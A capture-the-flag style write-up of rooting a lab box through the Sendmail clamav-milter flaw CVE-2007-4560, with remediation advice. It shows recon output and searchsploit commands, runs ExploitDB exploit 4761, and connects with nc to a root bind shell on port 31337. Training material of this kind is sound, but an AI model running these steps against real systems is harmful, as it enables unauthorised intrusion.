
| Box    | IP Address     | OS    | Difficulty | Status | Notes                         |
| ------ | -------------- | ----- | ---------- | ------ | ----------------------------- |
| ClamAV | 192.168.136.42 | Linux | Easy       | Rooted | Sendmail/ClamAV vulnerability |
# Vulnerability 
**Name**: CVE 2007 4560 
**Versions affected**: clamav-milter < 0.91.2 
**Note:** Sendmail with clamav-milter < 0.91.2 - Remote Command Execution
[ExploitDB Here](https://www.exploit-db.com/exploits/4761)
## Description
[NIST-CVE-2007-4560](https://nvd.nist.gov/vuln/detail/cve-2007-4560)
```
clamav-milter in ClamAV before 0.91.2, when run in black hole mode, allows remote attackers to execute arbitrary commands via shell metacharacters that are used in a certain popen call, involving the "recipient field of sendmail.
```

### What is clamav-milter
## Remediation 
- Upgrade ClamAV to version 0.91.2 or later
#### If Updating isn't an option
- Disable `clamav-milter` black hole mode
- Stop using `clamav-milter` with Sendmail

# Information Gathering
- First we enumerated with `rustscan` `nmap` and directory scanning tools.
#### **rustscan**
`rustscan -a 192.168.136.42 -- -A -p-`
``` shell
Open 192.168.136.42:22
Open 192.168.136.42:25
Open 192.168.136.42:80
Open 192.168.136.42:139
Open 192.168.136.42:199
Open 192.168.136.42:445
Open 192.168.136.42:60000
```

#### **nmap**
`nmap -sV -sC 192.168.136.42`
``` shell
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 11:28 -0400
Nmap scan report for 192.168.136.42
Host is up (0.020s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp   open     smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.220], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp   open     http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-title: Ph33r
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp  open     smux        Linux SNMP multiplexer
445/tcp  open     netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
1783/tcp filtered unknown
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-09-09T15:29:01-04:00
|_clock-skew: mean: 5h59m58s, deviation: 2h49m42s, median: 3h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.68 seconds

```

#### **UDP nmap**
``` shell
 nmap -sU 192.168.136.42   
```
``` shell
ost is up (0.15s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT    STATE         SERVICE
137/udp open          netbios-ns
138/udp open|filtered netbios-dgm
161/udp open          snmp

```

### Port 25

#### nmap script scan
``` shell
# command
map --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.136.42
```

``` shell
ORT   STATE SERVICE
25/tcp open  smtp
| smtp-commands: localhost.localdomain Hello [192.168.45.220], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
| smtp-enum-users: 
|   root
|   admin
|   administrator
|   webadmin
|   sysadmin
|   netadmin
|   guest
|   user
|   web
|_  test
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE

```
- We see this is Sendmail and look up Sendmail exploits for the version number
``` shell
25/tcp   open     smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
```

# Exploit
- We see a vulnerability for our sendmail version relating to ClamAV - the name of our box
- ![CVE-2007](images/cve-2007.png)

``` shell
# searchsploit commands
   searchsploit clamav-milter
   searchsploit 4761
   searchsploit -m 4761.pl

```

- Now that the epxloit is in our local directory we can use it.
- `.pl` is a Perl script so we can use `perl` to run it.

![img2](images/img2.png)

- the script wants us to include an IP address when we run it
- After running the script  we notice at the bottom it says something reltaed to **port 31337** tcp.. specifically : 
![img4](images/img4.png)

- We use `nmap` again to check the open ports on this server
``` shell
nmap 192.168.136.42           
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 15:23 -0400
Nmap scan report for 192.168.136.42
Host is up (0.019s latency).
Not shown: 993 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
139/tcp   open  netbios-ssn
199/tcp   open  smux
445/tcp   open  microsoft-ds
31337/tcp open  Elite

Nmap done: 1 IP address (1 host up) scanned in 2.25 seconds
```

- And look at that! a new port ! and its open..
- Let's try to connect with `nc 192.168.136.42 31337`


![root](images/root.png)

- And we are connected.
- Proof of flag
![img3](images/img3.png)
